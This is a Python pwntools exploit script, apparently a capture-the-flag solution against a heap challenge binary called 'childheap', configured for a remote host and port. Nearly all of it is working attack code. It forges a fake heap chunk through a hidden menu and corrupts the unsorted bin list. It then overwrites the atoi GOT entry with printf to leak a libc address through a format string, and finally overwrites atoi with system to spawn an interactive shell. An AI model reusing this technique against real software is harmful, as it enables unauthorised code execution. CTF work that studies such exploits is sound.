#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "13.124.131.103"
PORT = 31337

PRINTF = 0x400750

def alloc(size, data):
	r.sendline("1")
	r.sendlineafter(":", str(size))
	r.sendlineafter(":", data)
	r.recvuntil(">")

def free():
	r.sendline("2")
	r.recvuntil(">")

def secret(comment):
	r.sendline("201527")
	r.sendlineafter(":", "1397048149")
	r.sendlineafter(":", comment)
	r.recvuntil(">")
 

def modify(modifyage, newage, modifyname, name):
	r.sendline("3")

	if (modifyage):
		r.sendlineafter("?", "y")
		r.sendlineafter(":", str(newage))
	else:
		r.sendlineafter("?", "n")

	r.sendlineafter(":", name)

	if (modifyname):
		r.sendlineafter("?", "y")
	else:
		r.sendlineafter("?", "n")

	r.recvuntil(">")


def exploit(r):
	r.recvuntil(">")
	
	log.info("Allocate => Allocate chunk with size 4095")
	alloc(4095, "AAAABBBB")

	log.info("Secret   => Create fake chunk by abusing the 'secret menu'")
	r.sendline("201527")
	r.sendlineafter(":", str(0x211))	# Create fake size 
	r.recvuntil(">")
	
	log.info("Free     => Free chunk")
	free()

	log.info("Modify   => Allocates an 'input' chunk, overlapping allocated chunk")
	modify(False, 100, True, "CCCCCCCC") 

	log.info("Free     => Puts chunk into unsorted bin list again")
	free()

	log.info("Modify   => Write fake FD/BK into allocated chunk")
	modify(False, 100, False, p64(0x0)+p64(0x6020b0))	

	log.info("Allocate => Removes chunk from unsorted bin list, overwriting FD pointer in fake chunk")
	alloc(4095, "AAAABBBB")

	# Unsorted bin list is now corrupt, so fix it	
	log.info("Modify   => Overwrite unsorted bin list in main_arena with fake 'secret' chunk pointers to fix unsorted bin list")
	modify(False, 100, True, p64(0x0)+p64(0x6020a8)+p64(0x6020a8))

	log.info("Free     => Reset allocated check and puts our fake chunk into unsorted bin list again")	
	free()
		
	log.info("Allocate => Get our fake 'secret' chunk and overwrite 'USER_INFO' with ATOI GOT")
	payload = "AAAABBBB"
	payload += p64(0x602070-0x8-0x2)
	
	alloc(512, payload)

	log.info("Modify   => Overwrite ATOI with printf")
	modify(False, 100, True, p64(PRINTF))

	log.info("Format   => Leak LIBC address")
	
	r.sendline("%3$p")
	LEAK = int(r.recvline().strip(), 16)
	LIBC = LEAK - 0xf69b0
	SYSTEM = LIBC + 0x45380

	print ""
	log.info("LIBC leak      : %s" % hex(LEAK))
	log.info("LIBC base      : %s" % hex(LIBC))
	log.info("SYSTEM         : %s" % hex(SYSTEM))
	print ""
	
	log.info("Modify   => Overwrite ATOI with system")

	# Since ATOI was overwritten, the number of chars now define the selected menu => 'AA\n' = 3
	r.sendline("AA")
	r.sendlineafter("?", "n")				# Ignore age
	r.sendlineafter(":", "AA"+p64(SYSTEM))	# Name
	r.sendlineafter("?", "y")				# Copy name to destination (ATOI got)
	r.recvuntil(">")

	log.info("Trigger shell...")
	r.sendline("sh")

	r.interactive()

	return

if __name__ == "__main__":
	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		exploit(r)
	else:
		r = process("./childheap", env={"LD_PRELOAD":"./libc.so.6"})
				
		print util.proc.pidof(r)
		pause()
		exploit(r)
    